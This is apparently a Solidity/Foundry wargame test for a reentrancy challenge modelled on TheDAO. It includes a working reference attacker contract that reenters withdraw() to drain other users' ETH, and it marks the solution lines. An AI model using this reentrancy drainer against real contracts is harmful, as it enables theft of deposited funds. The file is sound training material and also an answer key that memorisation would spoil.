// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// WARGAME CHALLENGE 3 — Reentrancy (maps to TheDAO, 2016)
//
// EtherWell sends ETH before it zeroes your balance. Two honest users have 5 ETH each in it. With your
// 1 ETH, drain all 11.
//
// To play: rewrite the WellAttacker contract below (it is the reference solution), then the marked lines.
// Win: the well is empty and you hold ~11 ETH.

import {Test} from "forge-std/Test.sol";
import {EtherWell} from "../../src/ctf/VulnSystems.sol";

// ── reference solution: a contract that reenters withdraw() until the well is empty ──
contract WellAttacker {
    EtherWell public well;
    uint256 public unit;

    constructor(EtherWell w) {
        well = w;
    }

    function attack() external payable {
        unit = msg.value;
        well.deposit{value: msg.value}();
        well.withdraw();
    }

    receive() external payable {
        if (address(well).balance >= unit) well.withdraw(); // reenter before balance[] is zeroed
    }

    function sweep(address to) external {
        (bool ok,) = to.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }
}

contract Challenge3_Reentrancy is Test {
    EtherWell well;
    address player = makeAddr("player");

    function setUp() public {
        well = new EtherWell();
        address alice = makeAddr("alice");
        address bob = makeAddr("bob");
        vm.deal(alice, 5 ether);
        vm.deal(bob, 5 ether);
        vm.prank(alice);
        well.deposit{value: 5 ether}();
        vm.prank(bob);
        well.deposit{value: 5 ether}();
        vm.deal(player, 1 ether);
    }

    function test_exploit() public {
        vm.startPrank(player);
        // ─────────────────────────────── SOLUTION ▼ (delete this and write your own) ───────────────────────────────
        WellAttacker atk = new WellAttacker(well);
        atk.attack{value: 1 ether}();
        atk.sweep(player);
        // ─────────────────────────────── SOLUTION ▲ ───────────────────────────────
        vm.stopPrank();

        assertEq(address(well).balance, 0, "the well should be empty");
        assertGe(player.balance, 10 ether, "you should hold everyone's ETH");
    }
}
